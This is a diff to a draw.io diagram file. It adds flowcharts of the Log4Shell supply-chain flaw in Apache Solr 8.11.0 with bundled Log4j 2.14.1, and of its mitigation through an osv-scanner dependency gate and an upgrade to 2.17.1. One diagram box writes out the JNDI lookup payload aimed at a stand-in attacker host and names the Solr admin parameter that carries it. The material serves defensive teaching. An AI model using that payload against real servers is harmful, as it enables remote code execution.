@@ -1,6 +1,6 @@
 <mxfile host="65bd71144e">
     <diagram id="AtPIgGalABai3sf17EXV" name="Flow Diagram of where things go wrong">
-        <mxGraphModel dx="595" dy="1182" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
+        <mxGraphModel dx="1077" dy="958" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
             <root>
                 <mxCell id="0"/>
                 <mxCell id="1" parent="0"/>
@@ -78,6 +78,124 @@
                 </mxCell>
                 <mxCell id="QA5lD1XoMoLC1UA6TjtG-28" parent="QA5lD1XoMoLC1UA6TjtG-26" style="text;strokeColor=#82b366;fillColor=#d5e8d4;align=left;verticalAlign=middle;spacingLeft=4;spacingRight=4;overflow=hidden;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;rotatable=0;whiteSpace=wrap;html=1;" value="Patched/Intended Flow" vertex="1">
                     <mxGeometry height="30" width="140" y="60" as="geometry"/>
+                </mxCell>
+            </root>
+        </mxGraphModel>
+    </diagram>
+    <diagram id="gcBmu8ibLqnKBqPoV_WT" name="Supply Chain Vulnerability Flow Diagram">
+        <mxGraphModel dx="646" dy="1744" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" background="light-dark(#ffffff, #121212)" math="0" shadow="0">
+            <root>
+                <mxCell id="aisRa2fLwmszTjcj4r4d-0"/>
+                <mxCell id="aisRa2fLwmszTjcj4r4d-1" parent="aisRa2fLwmszTjcj4r4d-0"/>
+                <mxCell id="gsbHr92MAZ9s94LdCjMp-0" parent="aisRa2fLwmszTjcj4r4d-1" style="rounded=1;arcSize=8;whiteSpace=wrap;html=1;fontSize=13;align=center;verticalAlign=middle;" value="Apache Solr 8.11.0 Build" vertex="1">
+                    <mxGeometry height="50" width="300" x="170" y="-10" as="geometry"/>
+                </mxCell>
+                <mxCell id="gsbHr92MAZ9s94LdCjMp-1" parent="aisRa2fLwmszTjcj4r4d-1" style="rounded=1;arcSize=8;whiteSpace=wrap;html=1;fontSize=13;align=center;verticalAlign=middle;" value="Log4j Core 2.14.1 Bundled as a Dependency" vertex="1">
+                    <mxGeometry height="50" width="300" x="170" y="80" as="geometry"/>
+                </mxCell>
+                <mxCell id="gsbHr92MAZ9s94LdCjMp-2" parent="aisRa2fLwmszTjcj4r4d-1" style="rounded=1;arcSize=8;whiteSpace=wrap;html=1;fontSize=13;align=center;verticalAlign=middle;" value="Dependency Not Scanned Before Release&#xa;(no SCA or SBOM gate)" vertex="1">
+                    <mxGeometry height="60" width="300" x="170" y="170" as="geometry"/>
+                </mxCell>
+                <mxCell id="gsbHr92MAZ9s94LdCjMp-3" parent="aisRa2fLwmszTjcj4r4d-1" style="rounded=1;arcSize=8;whiteSpace=wrap;html=1;fontSize=13;align=center;verticalAlign=middle;" value="Vulnerable Component Released to Production&lt;br&gt;(CVE-2021-44228)" vertex="1">
+                    <mxGeometry height="60" width="300" x="170" y="270" as="geometry"/>
+                </mxCell>
+                <mxCell id="gsbHr92MAZ9s94LdCjMp-4" parent="aisRa2fLwmszTjcj4r4d-1" style="rounded=1;arcSize=8;whiteSpace=wrap;html=1;fontSize=13;align=center;verticalAlign=middle;" value="Attacker Supplies a JNDI Lookup Payload&#xa;${jndi:ldap://attacker:1389/x} in the&#xa;/solr/admin/cores action parameter" vertex="1">
+                    <mxGeometry height="70" width="300" x="170" y="370" as="geometry"/>
+                </mxCell>
+                <mxCell id="gsbHr92MAZ9s94LdCjMp-5" parent="aisRa2fLwmszTjcj4r4d-1" style="rounded=1;arcSize=8;whiteSpace=wrap;html=1;fontSize=13;align=center;verticalAlign=middle;" value="Log4j 2.14.1 Performs a JNDI / LDAP&#xa;Lookup to the Attacker Server" vertex="1">
+                    <mxGeometry height="60" width="300" x="170" y="480" as="geometry"/>
+                </mxCell>
+                <mxCell id="gsbHr92MAZ9s94LdCjMp-6" parent="aisRa2fLwmszTjcj4r4d-1" style="rounded=1;arcSize=8;whiteSpace=wrap;html=1;fontSize=13;align=center;verticalAlign=middle;fontStyle=0" value="&lt;span style=&quot;color: rgb(0, 0, 0);&quot;&gt;Malicious Java Class Returned, Loaded and Executed&lt;/span&gt;&lt;div&gt;(Confidentiality, Integrity and Availability Breach: Remote Code Execution)&lt;/div&gt;" vertex="1">
+                    <mxGeometry height="70" width="300" x="170" y="580" as="geometry"/>
+                </mxCell>
+                <mxCell id="gsbHr92MAZ9s94LdCjMp-9" edge="1" parent="aisRa2fLwmszTjcj4r4d-1" source="gsbHr92MAZ9s94LdCjMp-0" style="edgeStyle=orthogonalEdgeStyle;rounded=1;html=1;endArrow=classic;endFill=1;" target="gsbHr92MAZ9s94LdCjMp-1">
+                    <mxGeometry relative="1" as="geometry"/>
+                </mxCell>
+                <mxCell id="gsbHr92MAZ9s94LdCjMp-10" edge="1" parent="aisRa2fLwmszTjcj4r4d-1" source="gsbHr92MAZ9s94LdCjMp-1" style="edgeStyle=orthogonalEdgeStyle;rounded=1;html=1;endArrow=classic;endFill=1;" target="gsbHr92MAZ9s94LdCjMp-2">
+                    <mxGeometry relative="1" as="geometry"/>
+                </mxCell>
+                <mxCell id="gsbHr92MAZ9s94LdCjMp-11" edge="1" parent="aisRa2fLwmszTjcj4r4d-1" source="gsbHr92MAZ9s94LdCjMp-2" style="edgeStyle=orthogonalEdgeStyle;rounded=1;html=1;endArrow=classic;endFill=1;" target="gsbHr92MAZ9s94LdCjMp-3">
+                    <mxGeometry relative="1" as="geometry"/>
+                </mxCell>
+                <mxCell id="gsbHr92MAZ9s94LdCjMp-12" edge="1" parent="aisRa2fLwmszTjcj4r4d-1" source="gsbHr92MAZ9s94LdCjMp-3" style="edgeStyle=orthogonalEdgeStyle;rounded=1;html=1;endArrow=classic;endFill=1;" target="gsbHr92MAZ9s94LdCjMp-4">
+                    <mxGeometry relative="1" as="geometry"/>
+                </mxCell>
+                <mxCell id="gsbHr92MAZ9s94LdCjMp-13" edge="1" parent="aisRa2fLwmszTjcj4r4d-1" source="gsbHr92MAZ9s94LdCjMp-4" style="edgeStyle=orthogonalEdgeStyle;rounded=1;html=1;endArrow=classic;endFill=1;" target="gsbHr92MAZ9s94LdCjMp-5">
+                    <mxGeometry relative="1" as="geometry"/>
+                </mxCell>
+                <mxCell id="gsbHr92MAZ9s94LdCjMp-14" edge="1" parent="aisRa2fLwmszTjcj4r4d-1" source="gsbHr92MAZ9s94LdCjMp-5" style="edgeStyle=orthogonalEdgeStyle;rounded=1;html=1;endArrow=classic;endFill=1;" target="gsbHr92MAZ9s94LdCjMp-6">
+                    <mxGeometry relative="1" as="geometry"/>
+                </mxCell>
+            </root>
+        </mxGraphModel>
+    </diagram>
+    <diagram id="hHItAgzDxSBPRn6nGYbj" name="Mitigated Supply Chain Flow">
+        <mxGraphModel dx="1292" dy="1150" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" background="light-dark(#ffffff, #121212)" math="0" shadow="0">
+            <root>
+                <mxCell id="FOW54eWK1y28Cox-jWLw-0"/>
+                <mxCell id="FOW54eWK1y28Cox-jWLw-1" parent="FOW54eWK1y28Cox-jWLw-0"/>
+                <mxCell id="J5XZJWtYObhGPRYt__Ul-0" parent="FOW54eWK1y28Cox-jWLw-1" style="rounded=1;arcSize=8;whiteSpace=wrap;html=1;fontSize=13;align=center;verticalAlign=middle;" value="Apache Solr 8.11.0 Build" vertex="1">
+                    <mxGeometry height="50" width="280" x="320" y="40" as="geometry"/>
+                </mxCell>
+                <mxCell id="J5XZJWtYObhGPRYt__Ul-1" parent="FOW54eWK1y28Cox-jWLw-1" style="rounded=1;arcSize=8;whiteSpace=wrap;html=1;fontSize=13;align=center;verticalAlign=middle;" value="Log4j Core 2.14.1 Included" vertex="1">
+                    <mxGeometry height="50" width="280" x="320" y="130" as="geometry"/>
+                </mxCell>
+                <mxCell id="J5XZJWtYObhGPRYt__Ul-2" parent="FOW54eWK1y28Cox-jWLw-1" style="rounded=1;arcSize=8;whiteSpace=wrap;html=1;fontSize=13;align=center;verticalAlign=middle;" value="Software Composition Analysis in CI&#xa;(osv-scanner gate)" vertex="1">
+                    <mxGeometry height="60" width="280" x="320" y="220" as="geometry"/>
+                </mxCell>
+                <mxCell id="J5XZJWtYObhGPRYt__Ul-3" parent="FOW54eWK1y28Cox-jWLw-1" style="rhombus;whiteSpace=wrap;html=1;fontSize=13;align=center;verticalAlign=middle;" value="Known Vulnerability Detected?&#xa;(CVE-2021-44228)" vertex="1">
+                    <mxGeometry height="130" width="280" x="320" y="330" as="geometry"/>
+                </mxCell>
+                <mxCell id="J5XZJWtYObhGPRYt__Ul-4" parent="FOW54eWK1y28Cox-jWLw-1" style="rounded=1;arcSize=8;whiteSpace=wrap;html=1;fontSize=13;align=center;verticalAlign=middle;" value="Build Blocked or Dependency&#xa;Upgraded to Log4j 2.17.1" vertex="1">
+                    <mxGeometry height="60" width="280" x="60" y="520" as="geometry"/>
+                </mxCell>
+                <mxCell id="J5XZJWtYObhGPRYt__Ul-5" parent="FOW54eWK1y28Cox-jWLw-1" style="rounded=1;arcSize=8;whiteSpace=wrap;html=1;fontSize=13;align=center;verticalAlign=middle;" value="Patched Component Released&#xa;(Log4j 2.17.1)" vertex="1">
+                    <mxGeometry height="60" width="280" x="60" y="620" as="geometry"/>
+                </mxCell>
+                <mxCell id="J5XZJWtYObhGPRYt__Ul-6" parent="FOW54eWK1y28Cox-jWLw-1" style="rounded=1;arcSize=8;whiteSpace=wrap;html=1;fontSize=13;align=center;verticalAlign=middle;" value="Malicious Payload Logged as Inert Data" vertex="1">
+                    <mxGeometry height="50" width="280" x="60" y="720" as="geometry"/>
+                </mxCell>
+                <mxCell id="J5XZJWtYObhGPRYt__Ul-7" parent="FOW54eWK1y28Cox-jWLw-1" style="rounded=1;arcSize=8;whiteSpace=wrap;html=1;fontSize=13;align=center;verticalAlign=middle;" value="No Remote Code Execution" vertex="1">
+                    <mxGeometry height="50" width="280" x="60" y="810" as="geometry"/>
+                </mxCell>
+                <mxCell id="J5XZJWtYObhGPRYt__Ul-8" parent="FOW54eWK1y28Cox-jWLw-1" style="rounded=1;arcSize=8;whiteSpace=wrap;html=1;fontSize=13;fontStyle=0;align=center;verticalAlign=middle;" value="Security Maintained" vertex="1">
+                    <mxGeometry height="50" width="280" x="60" y="900" as="geometry"/>
+                </mxCell>
+                <mxCell id="J5XZJWtYObhGPRYt__Ul-9" parent="FOW54eWK1y28Cox-jWLw-1" style="rounded=1;arcSize=8;whiteSpace=wrap;html=1;fontSize=13;align=center;verticalAlign=middle;" value="Zero-Day: No Advisory Match,&#xa;Component Ships" vertex="1">
+                    <mxGeometry height="60" width="280" x="580" y="520" as="geometry"/>
+                </mxCell>
+                <mxCell id="J5XZJWtYObhGPRYt__Ul-10" parent="FOW54eWK1y28Cox-jWLw-1" style="rounded=1;arcSize=8;whiteSpace=wrap;html=1;fontSize=13;fontStyle=0;align=center;verticalAlign=middle;" value="Residual Risk: SCA Cannot See Unknown CVEs" vertex="1">
+                    <mxGeometry height="60" width="280" x="580" y="620" as="geometry"/>
+                </mxCell>
+                <mxCell id="J5XZJWtYObhGPRYt__Ul-11" edge="1" parent="FOW54eWK1y28Cox-jWLw-1" source="J5XZJWtYObhGPRYt__Ul-0" style="edgeStyle=orthogonalEdgeStyle;rounded=1;html=1;endArrow=classic;endFill=1;" target="J5XZJWtYObhGPRYt__Ul-1">
+                    <mxGeometry relative="1" as="geometry"/>
+                </mxCell>
+                <mxCell id="J5XZJWtYObhGPRYt__Ul-12" edge="1" parent="FOW54eWK1y28Cox-jWLw-1" source="J5XZJWtYObhGPRYt__Ul-1" style="edgeStyle=orthogonalEdgeStyle;rounded=1;html=1;endArrow=classic;endFill=1;" target="J5XZJWtYObhGPRYt__Ul-2">
+                    <mxGeometry relative="1" as="geometry"/>
+                </mxCell>
+                <mxCell id="J5XZJWtYObhGPRYt__Ul-13" edge="1" parent="FOW54eWK1y28Cox-jWLw-1" source="J5XZJWtYObhGPRYt__Ul-2" style="edgeStyle=orthogonalEdgeStyle;rounded=1;html=1;endArrow=classic;endFill=1;" target="J5XZJWtYObhGPRYt__Ul-3">
+                    <mxGeometry relative="1" as="geometry"/>
+                </mxCell>
+                <mxCell id="J5XZJWtYObhGPRYt__Ul-14" edge="1" parent="FOW54eWK1y28Cox-jWLw-1" source="J5XZJWtYObhGPRYt__Ul-3" style="edgeStyle=orthogonalEdgeStyle;rounded=1;html=1;endArrow=classic;endFill=1;fontColor=#000000;fontStyle=1;" target="J5XZJWtYObhGPRYt__Ul-4" value="Yes">
+                    <mxGeometry relative="1" as="geometry"/>
+                </mxCell>
+                <mxCell id="J5XZJWtYObhGPRYt__Ul-15" edge="1" parent="FOW54eWK1y28Cox-jWLw-1" source="J5XZJWtYObhGPRYt__Ul-3" style="edgeStyle=orthogonalEdgeStyle;rounded=1;html=1;endArrow=classic;endFill=1;fontColor=#000000;fontStyle=1;" target="J5XZJWtYObhGPRYt__Ul-9" value="No">
+                    <mxGeometry relative="1" as="geometry"/>
+                </mxCell>
+                <mxCell id="J5XZJWtYObhGPRYt__Ul-16" edge="1" parent="FOW54eWK1y28Cox-jWLw-1" source="J5XZJWtYObhGPRYt__Ul-4" style="edgeStyle=orthogonalEdgeStyle;rounded=1;html=1;endArrow=classic;endFill=1;" target="J5XZJWtYObhGPRYt__Ul-5">
+                    <mxGeometry relative="1" as="geometry"/>
+                </mxCell>
+                <mxCell id="J5XZJWtYObhGPRYt__Ul-17" edge="1" parent="FOW54eWK1y28Cox-jWLw-1" source="J5XZJWtYObhGPRYt__Ul-5" style="edgeStyle=orthogonalEdgeStyle;rounded=1;html=1;endArrow=classic;endFill=1;" target="J5XZJWtYObhGPRYt__Ul-6">
+                    <mxGeometry relative="1" as="geometry"/>
+                </mxCell>
+                <mxCell id="J5XZJWtYObhGPRYt__Ul-18" edge="1" parent="FOW54eWK1y28Cox-jWLw-1" source="J5XZJWtYObhGPRYt__Ul-6" style="edgeStyle=orthogonalEdgeStyle;rounded=1;html=1;endArrow=classic;endFill=1;" target="J5XZJWtYObhGPRYt__Ul-7">
+                    <mxGeometry relative="1" as="geometry"/>
+                </mxCell>
+                <mxCell id="J5XZJWtYObhGPRYt__Ul-19" edge="1" parent="FOW54eWK1y28Cox-jWLw-1" source="J5XZJWtYObhGPRYt__Ul-7" style="edgeStyle=orthogonalEdgeStyle;rounded=1;html=1;endArrow=classic;endFill=1;" target="J5XZJWtYObhGPRYt__Ul-8">
+                    <mxGeometry relative="1" as="geometry"/>
+                </mxCell>
+                <mxCell id="J5XZJWtYObhGPRYt__Ul-20" edge="1" parent="FOW54eWK1y28Cox-jWLw-1" source="J5XZJWtYObhGPRYt__Ul-9" style="edgeStyle=orthogonalEdgeStyle;rounded=1;html=1;endArrow=classic;endFill=1;" target="J5XZJWtYObhGPRYt__Ul-10">
+                    <mxGeometry relative="1" as="geometry"/>
                 </mxCell>
             </root>
         </mxGraphModel>
